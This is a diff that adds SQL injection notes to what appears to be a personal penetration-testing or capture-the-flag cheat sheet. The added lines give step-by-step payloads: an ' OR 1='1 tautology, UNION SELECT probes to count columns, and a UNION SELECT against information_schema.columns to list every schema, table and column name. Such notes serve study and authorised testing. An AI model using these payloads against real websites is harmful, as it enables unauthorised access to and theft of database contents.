@@ -467,10 +467,22 @@ Can be found using a Single Quote => '
 
 
 
+step 1: Determine the vulnerable field
+step 2: Test all options avaialble
+step 3: Leverage vulnerable field
+```{option}' OR 1='1```
+step 5: Identify number of columns
+```
+{option}' UNION SELECT 1,2,3,4 #
+{option}' UNION SELECT 1,2,3,4,5 #
+```
+	* 4 columns displayed, column 2 hidden
+ step 6: Golden Statement
+UNION SELECT table_schema,table_name,column_name from information_schema.columns #
 
-
-
-
+```
+UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+```
 
 
 
